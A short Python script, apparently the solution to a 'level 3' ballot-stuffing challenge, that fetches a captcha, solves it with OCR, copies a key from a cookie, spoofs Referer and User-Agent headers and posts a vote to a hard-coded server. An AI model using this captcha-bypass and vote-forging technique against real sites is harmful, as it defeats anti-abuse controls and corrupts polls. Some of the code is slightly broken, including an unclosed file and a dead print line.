#!/usr/bin/python3
import requests
from pytesseract import *
from PIL import Image



x = "http://158.69.76.135/level3.php/"
cap = "http://158.69.76.135/captcha.php"

header = {
  "Referer": "http://158.69.76.135/level3.php",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
}

def get(link):
    img_cap = requests.get(cap)
    file = open("temp.png", "wb")
    file.write(img_cap.content)
    file.close


get(cap)
im = Image.open("temp.png")
capcha = image_to_string(im)
ho = requests.get(x)
cookies = ho.cookies
dictionary = cookies.get_dict()
key = dictionary.get('HoldTheDoor')
payload = {'id': '2', 'key': key, 'holdthedoor': 'Submit Query', 'captcha': capcha}
s = requests.Session()
s.headers = header
res = s.post(x, data=payload, cookies=cookies)
'print("Vote n*{:d} Code:{} Key:{}".format(i, res, key))'
print(capcha)
print(ho.content)